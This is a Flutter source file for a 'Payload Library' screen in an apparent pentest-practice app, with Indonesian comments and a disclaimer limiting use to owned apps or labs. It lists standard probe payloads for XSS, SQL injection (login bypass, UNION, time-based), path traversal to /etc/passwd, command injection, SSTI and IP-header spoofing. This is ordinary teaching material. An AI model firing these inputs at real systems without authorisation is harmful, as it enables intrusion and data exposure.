import 'package:flutter/material.dart';
import '../theme/laxx_theme.dart';
import '../widgets/glass_card.dart';
import '../widgets/tool_page.dart';

/// (kategori, payload, catatan). Untuk latihan di aplikasi/lab milik sendiri.
const List<(String, String, String)> payloadLibrary = [
  ('XSS', '<script>alert(1)</script>', 'Dasar: script langsung'),
  ('XSS', '"><img src=x onerror=alert(1)>', 'Keluar dari atribut lalu sisipkan event handler'),
  ('XSS', '<svg onload=alert(1)>', 'Tag SVG dengan event onload'),
  ("XSS", "'-alert(1)-'", 'Konteks string JavaScript'),
  ('XSS', 'javascript:alert(1)', 'Atribut href/src yang menerima URL'),
  ('SQLi', "' OR '1'='1", 'Kondisi selalu benar (uji login bypass)'),
  ('SQLi', "' OR 1=1-- -", 'Komentar untuk memotong query'),
  ('SQLi', "' UNION SELECT NULL-- -", 'Uji jumlah kolom pada UNION'),
  ('SQLi', "' AND SLEEP(5)-- -", 'Time-based: menunda respons MySQL'),
  ('SQLi', "'", 'Deteksi error: tanda kutip tunggal'),
  ('Path traversal', '../../../../etc/passwd', 'Uji validasi path pada parameter file'),
  ('Path traversal', '..%2f..%2f..%2fetc%2fpasswd', 'Versi URL-encoded'),
  ('Open redirect', 'https://example.com', 'Cek apakah parameter redirect menerima domain luar'),
  ('Command injection', '; echo crax_test', 'Penanda aman: cek output echo'),
  ('SSTI', '{{7*7}}', 'Jika muncul 49, template engine mengevaluasi input'),
  ('Header', 'X-Forwarded-For: 127.0.0.1', 'Uji logika akses berbasis IP'),
];

class PayloadScreen extends StatefulWidget {
  const PayloadScreen({super.key});

  @override
  State<PayloadScreen> createState() => _PayloadScreenState();
}

class _PayloadScreenState extends State<PayloadScreen> {
  String _cat = 'Semua';

  @override
  Widget build(BuildContext context) {
    final t = Theme.of(context).textTheme;
    final cats = ['Semua', ...payloadLibrary.map((e) => e.$1).toSet()];
    final shown = payloadLibrary.where((e) => _cat == 'Semua' || e.$1 == _cat);

    return ToolPage(
      title: 'Payload Library',
      children: [
        GlassCard(
          child: Text(
            'Kumpulan payload umum untuk latihan di aplikasi milik sendiri atau lab. Jangan dipakai pada target tanpa izin tertulis.',
            style: t.bodySmall,
          ),
        ),
        const SizedBox(height: 12),
        Wrap(
          spacing: 8,
          runSpacing: 8,
          children: [
            for (final c in cats)
              ChoiceChip(
                label: Text(c),
                selected: _cat == c,
                selectedColor: Laxx.accent.withOpacity(0.25),
                onSelected: (_) => setState(() => _cat = c),
              ),
          ],
        ),
        const SizedBox(height: 12),
        for (final item in shown)
          ResultRow('${item.$1}  •  ${item.$3}', item.$2),
      ],
    );
  }
}
